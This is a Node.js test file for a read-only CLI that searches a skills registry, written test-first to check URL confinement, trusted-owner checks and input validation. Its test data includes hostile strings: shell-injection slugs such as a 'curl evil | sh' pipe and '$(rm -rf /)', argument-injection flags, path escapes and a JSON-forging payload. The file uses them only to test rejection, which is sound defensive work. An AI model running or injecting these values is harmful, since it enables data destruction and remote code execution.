// TDD (RED first): tests for skills-cli.mjs -- the read-only discovery gateway to
// the skills.sh registry. Written BEFORE the implementation (per the approved spec
// docs/superpowers/specs/2026-07-21-skills-cli-discovery-design.md), so importing
// ./skills-cli.mjs fails until it exists -- that is the intended failing state.
//
// Pure logic + the security core. The network path (performSearch) takes an
// injectable `deps.fetch` (never a real request). Any exotic byte is built via
// String.fromCodePoint -- typing a literal control/unicode char into source has
// corrupted this repo's files before (see app/CLAUDE.md "typing Unicode escapes").
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import {
  REGISTRY_BASE,           // const default "https://skills.sh"
  buildSearchUrl,          // ({ query, owner, limit }) -> URL (host-locked, encoded, limit rules)
  assertConfined,          // (url, base) -> throws off-origin / off-path
  formatResults,           // (json) -> enriched rows (validated, trusted-first)
  isTrustedOwner,          // (owner) -> bool (exact case-insensitive ASCII; env-extensible)
  validateRegistryBase,    // (raw) -> normalized origin, throws on junk
  parseArgs,               // (argv) -> { command, positionals, flags }; find-only
  performSearch,           // (url, deps={}) -> { ok, status, results?, error?, truncated } via deps.fetch
  renderResults,           // (rows) -> the CLI's actual stdout string (JSON, spec-mandated)
} from "./skills-cli.mjs";

const BASE = "https://skills.sh";
const NUL = String.fromCodePoint(0);
const CYRILLIC_E = String.fromCodePoint(0x435); // homoglyph of ASCII 'e'

// ---------------------------------------------------------------- buildSearchUrl
test("buildSearchUrl targets the fixed registry search endpoint", () => {
  const url = buildSearchUrl({ query: "typescript" });
  assert.equal(url.origin, BASE);
  assert.equal(url.pathname, "/api/search");
  assert.equal(url.searchParams.get("q"), "typescript");
  assert.equal(url.searchParams.get("limit"), "10"); // default when absent
});

test("buildSearchUrl encodes the query -- special chars land in q, never inject host/path/params", () => {
  const url = buildSearchUrl({ query: "a b&owner=evil#/x?z" });
  assert.equal(url.origin, BASE);
  assert.equal(url.pathname, "/api/search");
  assert.equal(url.searchParams.get("q"), "a b&owner=evil#/x?z"); // whole value round-trips into q
  assert.equal(url.searchParams.get("owner"), null);              // not smuggled into a second param
  assert.ok(url.search.includes("a+b") || url.search.includes("a%20b")); // encoded, not raw space
});

test("buildSearchUrl adds owner only when provided", () => {
  assert.equal(buildSearchUrl({ query: "x" }).searchParams.get("owner"), null);
  assert.equal(buildSearchUrl({ query: "x", owner: "vercel-labs" }).searchParams.get("owner"), "vercel-labs");
});

test("buildSearchUrl: limit -- pass-through, clamp-high, reject-low/non-numeric", () => {
  assert.equal(buildSearchUrl({ query: "x", limit: 5 }).searchParams.get("limit"), "5");
  assert.equal(buildSearchUrl({ query: "x", limit: "5" }).searchParams.get("limit"), "5"); // parseArgs hands limit through as a STRING
  assert.equal(buildSearchUrl({ query: "x", limit: 999 }).searchParams.get("limit"), "25"); // clamp to ceiling
  for (const bad of [0, -3, "abc", 1.5, NaN]) {
    assert.throws(() => buildSearchUrl({ query: "x", limit: bad }), /limit/i, `limit=${JSON.stringify(bad)} must reject`);
  }
});

test("buildSearchUrl requires a non-empty query and rejects control-char / oversized queries", () => {
  assert.throws(() => buildSearchUrl({ query: "" }), /query/i);
  assert.throws(() => buildSearchUrl({}), /query/i);
  assert.throws(() => buildSearchUrl({ query: "a" + NUL + "b" }), /control|invalid|query/i);
  assert.throws(() => buildSearchUrl({ query: "x".repeat(2000) }), /long|length|invalid|query/i);
});

// ---------------------------------------------------------------- assertConfined
test("assertConfined (load-bearing) accepts the registry endpoint, rejects off-origin/off-path", () => {
  assert.doesNotThrow(() => assertConfined(new URL(`${BASE}/api/search?q=x`), BASE));
  assert.throws(() => assertConfined(new URL("https://evil.test/api/search"), BASE), /escaped|refusing/i);
  assert.throws(() => assertConfined(new URL(`${BASE}/api/other`), BASE), /escaped|refusing|path/i);
  assert.throws(() => assertConfined(new URL(`${BASE}/api/searchx`), BASE), /escaped|refusing|path/i); // prefix, not the path
});

// ---------------------------------------------------------------- isTrustedOwner
test("isTrustedOwner: exact case-insensitive ASCII match against verified vendor orgs only", () => {
  assert.equal(isTrustedOwner("vercel-labs"), true);
  assert.equal(isTrustedOwner("Vercel-Labs"), true);  // GitHub owners case-insensitive
  assert.equal(isTrustedOwner("vercel"), true);
  assert.equal(isTrustedOwner("anthropics"), true);   // the REAL org
  assert.equal(isTrustedOwner("microsoft"), true);

  assert.equal(isTrustedOwner("anthropic"), false);   // NOT the real org (squattable)
  assert.equal(isTrustedOwner("verceI-labs"), false); // capital-I ASCII lookalike
  assert.equal(isTrustedOwner("verc" + CYRILLIC_E + "l-labs"), false); // Cyrillic-e homoglyph
  assert.equal(isTrustedOwner("vercel-labs-x"), false); // suffix squat
  assert.equal(isTrustedOwner("x-vercel-labs"), false);
  assert.equal(isTrustedOwner(""), false);
  assert.equal(isTrustedOwner(null), false);
});

test("isTrustedOwner honors an operator-set SKILLS_TRUSTED_OWNERS env addition (validated the same way)", () => {
  const prev = process.env.SKILLS_TRUSTED_OWNERS;
  process.env.SKILLS_TRUSTED_OWNERS = "myorg, another-org, verc" + CYRILLIC_E + "l-labs, bad/slash, ";
  try {
    assert.equal(isTrustedOwner("myorg"), true);
    assert.equal(isTrustedOwner("MyOrg"), true);      // case-insensitive
    assert.equal(isTrustedOwner("myorg2"), false);    // exact, not prefix
    assert.equal(isTrustedOwner("vercel-labs"), true); // built-ins still trusted
    // env entries are validated the SAME way -- junk can't sneak into the strong signal:
    assert.equal(isTrustedOwner("verc" + CYRILLIC_E + "l-labs"), false); // homoglyph env entry rejected
    assert.equal(isTrustedOwner("bad/slash"), false);                    // junk env entry rejected
  } finally {
    if (prev === undefined) delete process.env.SKILLS_TRUSTED_OWNERS;
    else process.env.SKILLS_TRUSTED_OWNERS = prev;
  }
});

// ---------------------------------------------------------------- formatResults
// Real skills.sh hit: `id` is the full "source/skillId" path, `skillId` is the clean slug.
const hit = (o) => ({ id: "vercel-labs/skills/find-skills", skillId: "find-skills", name: "Find Skills", installs: 1200, source: "vercel-labs/skills", ...o });

test("formatResults maps a clean hit -> validated row with url + installCommand + trusted", () => {
  const [r] = formatResults([hit()]);
  assert.equal(r.slug, "find-skills");
  assert.equal(r.name, "Find Skills");
  assert.equal(r.installs, 1200);
  assert.equal(r.owner, "vercel-labs");
  assert.equal(r.repo, "skills");
  assert.equal(r.url, "https://github.com/vercel-labs/skills");
  assert.equal(r.installCommand, "npx skills add vercel-labs/skills@find-skills");
  assert.equal(r.trusted, true);
  assert.equal(r.sourceRaw, undefined); // clean -> no raw fallback
});

test("formatResults orders trusted-owner hits first, NOT by installs", () => {
  const rows = formatResults([
    hit({ id: "a", source: "randopublisher/thing", installs: 999999 }), // untrusted, huge installs
    hit({ id: "b", source: "vercel-labs/skills", installs: 3 }),        // trusted, tiny installs
  ]);
  assert.equal(rows[0].owner, "vercel-labs"); // trusted first despite far fewer installs
  assert.equal(rows[1].owner, "randopublisher");
});

test("formatResults: a malicious/odd source yields NO url/installCommand -- raw, labeled unverified", () => {
  const badSources = [
    "a/b/c", "evil.example/x", "vercel-labs", "own@er/repo", "o/r?x", "o/r#f", "o/r ", "", "o//r", "o/r&sh",
    "../..", ".", "o/..",                    // path-shaped root-escape (github.com/../..)
    "-g/x", "--yes/x", "o/-g",               // leading-dash: argument injection into `npx skills add`
    "a".repeat(40) + "/x", "o/" + "r".repeat(65), // over-length (owner >39, repo >64)
    "verc" + CYRILLIC_E + "l/repo",          // unicode homoglyph owner
    "o/r" + NUL,                             // control char
  ];
  for (const source of badSources) {
    const [r] = formatResults([hit({ source, skillId: "clean-slug" })]);
    assert.equal(r.url, null, `url must be null for source=${JSON.stringify(source)}`);
    assert.equal(r.installCommand, null, `installCommand must be null for source=${JSON.stringify(source)}`);
    assert.equal(r.owner, null);
    assert.equal(r.repo, null);
    assert.ok(typeof r.sourceRaw === "string", "raw source surfaced, labeled unverified");
  }
});

test("formatResults (NEW-1): a shell/arg-hostile slug never reaches installCommand", () => {
  const backtick = String.fromCodePoint(0x60);
  const badSlugs = [
    "; curl evil | sh", "a" + backtick + "whoami" + backtick, "$(rm -rf /)", "a b", "a/b", "a@b", "", "sk" + NUL + "ill",
    "&& x", "a|b",                       // shell metachars incl. &
    "..", ".",                           // dot-only
    "-g", "--yes",                       // leading-dash argument injection (-g is the CLI's global flag)
    "s".repeat(65),                      // over-length
    "sl" + CYRILLIC_E + "ug",            // unicode homoglyph
  ];
  for (const id of badSlugs) {
    const [r] = formatResults([hit({ skillId: id, source: "vercel-labs/skills" })]);
    assert.equal(r.installCommand, null, `installCommand must be null for id=${JSON.stringify(id)}`);
    assert.equal(r.slug, null);
    assert.equal(r.url, "https://github.com/vercel-labs/skills"); // url derives from source only
  }
});

test("formatResults: a clean owner/repo + clean slug is the ONLY shape that yields installCommand", () => {
  const [ok] = formatResults([hit({ source: "vercel-labs/skills", skillId: "find-skills" })]);
  assert.equal(ok.installCommand, "npx skills add vercel-labs/skills@find-skills");
  const [badSlug] = formatResults([hit({ source: "vercel-labs/skills", skillId: "bad slug" })]);
  assert.equal(badSlug.installCommand, null);
  const [badSrc] = formatResults([hit({ source: "vercel-labs", skillId: "find-skills" })]);
  assert.equal(badSrc.installCommand, null);
});

test("formatResults accepts real boundary shapes (not over-tight)", () => {
  const owner39 = "a".repeat(39), slug64 = "s".repeat(64);
  const [r1] = formatResults([hit({ source: `${owner39}/repo`, skillId: "clean" })]);
  assert.equal(r1.owner, owner39);
  assert.equal(r1.url, `https://github.com/${owner39}/repo`);
  const [r2] = formatResults([hit({ source: "vercel-labs/skills", skillId: slug64 })]);
  assert.equal(r2.slug, slug64);
  assert.ok(r2.installCommand);
  const [r3] = formatResults([hit({ source: "a1/a..b", skillId: "a_b" })]); // internal dots, underscore in slug
  assert.equal(r3.owner, "a1");
  assert.equal(r3.repo, "a..b");
  assert.equal(r3.slug, "a_b");
  assert.ok(r3.url && r3.installCommand);
  const [r4] = formatResults([hit({ source: "x/y", skillId: "z" })]); // single-char
  assert.ok(r4.url && r4.installCommand);
});

test("renderResults: a newline/quote name can't forge a sibling field in the CLI's actual emitted output", () => {
  const payload = "evil" + String.fromCodePoint(34) + "," + String.fromCodePoint(10) + String.fromCodePoint(34) + "trusted" + String.fromCodePoint(34) + ":true";
  const rows = formatResults([hit({ name: payload, source: "rando/x" })]);
  assert.equal(rows[0].trusted, false); // computed from owner, not the name payload (non-tautological)
  const emitted = renderResults(rows); // the CLI's ACTUAL stdout serialization, not the test's own stringify
  const parsed = JSON.parse(emitted);  // valid JSON -> the hostile name is escaped, not breaking structure
  assert.equal(parsed.length, 1);
  assert.equal(parsed[0].trusted, false);       // exactly one trusted field -- the real one, not the forged payload
  assert.ok(parsed[0].name.includes("evil"));   // payload contained as a plain string value
});

test("formatResults tolerates missing/garbage input and caps output", () => {
  assert.deepEqual(formatResults([]), []);
  assert.deepEqual(formatResults(null), []);
  assert.deepEqual(formatResults({ nope: 1 }), []);
  const [r] = formatResults([{ id: "x", source: "o/r" }]); // no name/installs
  assert.equal(r.installs, 0); // defaulted
  assert.equal(typeof r.name, "string");
  assert.ok(formatResults(Array.from({ length: 500 }, (_, i) => hit({ id: `s${i}` }))).length <= 25); // capped
});

// ------------------------------------------------------------ validateRegistryBase
test("validateRegistryBase: accepts a clean http(s) origin, rejects junk (gmail-auth precedent)", () => {
  assert.equal(validateRegistryBase("https://skills.sh"), "https://skills.sh");
  assert.equal(validateRegistryBase("https://skills.sh/"), "https://skills.sh"); // built from parsed origin
  assert.equal(validateRegistryBase("http://localhost:8787"), "http://localhost:8787"); // operator local test
  for (const bad of ["skills.sh", "ftp://skills.sh", "https://skills.sh/path", "https://skills.sh?x", "https://u:p@skills.sh", "not a url", ""]) {
    assert.throws(() => validateRegistryBase(bad), /SKILLS_REGISTRY_BASE|must be|invalid|url/i, `should reject ${JSON.stringify(bad)}`);
  }
});

// ---------------------------------------------------------------- performSearch (network, stubbed)
const stubFetch = (impl) => ({ fetch: impl });

test("performSearch: a non-2xx registry response -> clean error result, not a throw", async () => {
  const deps = stubFetch(async () => ({ ok: false, status: 503, text: async () => "down" }));
  const r = await performSearch(new URL(`${BASE}/api/search?q=x`), deps);
  assert.equal(r.ok, false);
  assert.equal(r.status, 503);
  assert.match(String(r.error), /503|registry|status/i);
});

test("performSearch: a non-JSON body -> clean error result", async () => {
  const deps = stubFetch(async () => ({ ok: true, status: 200, text: async () => "<html>not json</html>" }));
  const r = await performSearch(new URL(`${BASE}/api/search?q=x`), deps);
  assert.equal(r.ok, false);
  assert.match(String(r.error), /json|parse/i);
});

test("performSearch: GETs the confined URL and returns formatted results", async () => {
  let calledUrl, calledMethod;
  const deps = stubFetch(async (u, opts) => {
    calledUrl = String(u);
    calledMethod = (opts && opts.method) || "GET";
    return { ok: true, status: 200, text: async () => JSON.stringify({ skills: [{ id: "vercel-labs/skills/find-skills", skillId: "find-skills", name: "F", installs: 9, source: "vercel-labs/skills" }] }) };
  });
  const r = await performSearch(new URL(`${BASE}/api/search?q=x`), deps);
  assert.equal(r.ok, true);
  assert.equal(calledMethod, "GET"); // never mutates
  assert.ok(calledUrl.startsWith(`${BASE}/api/search`));
  assert.ok(Array.isArray(r.results) && r.results[0].owner === "vercel-labs");
});

test("performSearch: caps an oversized body (truncation flagged, not silently trusted)", async () => {
  const huge = "[" + JSON.stringify({ id: "x", name: "n".repeat(2_000_000), installs: 1, source: "o/r" }) + "]";
  const deps = stubFetch(async () => ({ ok: true, status: 200, text: async () => huge }));
  const r = await performSearch(new URL(`${BASE}/api/search?q=x`), deps);
  assert.ok(r.truncated === true || r.ok === false); // a truncated body is flagged and/or fails to parse cleanly
});

test("performSearch: a fetch/network throw -> clean error result, not an unhandled rejection", async () => {
  const deps = stubFetch(async () => { throw new Error("ECONNREFUSED"); });
  const r = await performSearch(new URL(`${BASE}/api/search?q=x`), deps);
  assert.equal(r.ok, false);
  assert.ok(String(r.error).length > 0);
});

test("performSearch: streams a reader-backed body and cancels the reader at the cap (DoS bound)", async () => {
  let cancelled = false, reads = 0;
  const chunk = new Uint8Array(600_000).fill(97); // 600 KB of 'a' -> 2 reads exceed the 1 MB cap
  const deps = stubFetch(async () => ({ ok: true, status: 200, body: { getReader: () => ({
    read: async () => (reads++ < 5 ? { done: false, value: chunk } : { done: true }),
    cancel: async () => { cancelled = true; },
  }) } }));
  const r = await performSearch(new URL(`${BASE}/api/search?q=x`), deps);
  assert.equal(cancelled, true);              // reader cancelled at the cap, not drained
  assert.ok(reads <= 2, `stopped after ~1 MB (reads=${reads}), not all 3 MB`);
  assert.equal(r.truncated, true);            // capped -> flagged
  assert.equal(r.ok, false);                  // a truncated body isn't valid JSON
  assert.match(String(r.error), /cap|narrow/i); // and the diagnostic says so, not "non-JSON"
});

test("performSearch: an AbortError (timeout) maps to an explicit timeout diagnostic", async () => {
  const deps = stubFetch(async () => { const e = new Error("This operation was aborted"); e.name = "AbortError"; throw e; });
  const r = await performSearch(new URL(`${BASE}/api/search?q=x`), deps);
  assert.equal(r.ok, false);
  assert.match(String(r.error), /timed out after 15000ms/);
});

// ------------------------------------------------------------------------ parseArgs
test("parseArgs: find is the only verb; add/install/unknown verbs error (no install path)", () => {
  const p = parseArgs(["find", "typescript", "--owner", "vercel-labs", "--limit", "5"]);
  assert.equal(p.command, "find");
  assert.deepEqual(p.positionals, ["typescript"]);
  assert.equal(p.flags.owner, "vercel-labs");
  assert.equal(p.flags.limit, "5");
  for (const verb of ["add", "install", "remove", "use", "sync", "bogus"]) {
    assert.throws(() => parseArgs([verb, "x"]), /unknown|usage|only.*find/i, `verb ${verb} must be refused`);
  }
});

test("parseArgs: an unknown flag errors loudly (no silent --base/--registry, no value-swallow)", () => {
  assert.throws(() => parseArgs(["find", "x", "--registry", "http://evil"]), /unknown flag|usage/i);
  assert.throws(() => parseArgs(["find", "x", "--base", "http://evil"]), /unknown flag|usage/i);
});

// ---------------------------------------------------------------- dispatch (real CLI, RED until built)
const CLI = fileURLToPath(new URL("./skills-cli.mjs", import.meta.url));
test("dispatch: bad verb/flag and query-less find exit 1 with a usage/error message (mirrors data-cli)", () => {
  for (const argv of [["add", "x"], ["find", "x", "--registry", "http://evil"], ["find"]]) {
    let err;
    try { execFileSync("node", [CLI, ...argv], { stdio: "pipe" }); } catch (e) { err = e; }
    assert.ok(err, `argv ${JSON.stringify(argv)} must exit non-zero`);
    assert.equal(err.status, 1, `argv ${JSON.stringify(argv)} must exit 1`);
    assert.match(String(err.stderr), /usage|unknown|refus|query|only/i); // a real error message, not a bare crash
  }
});
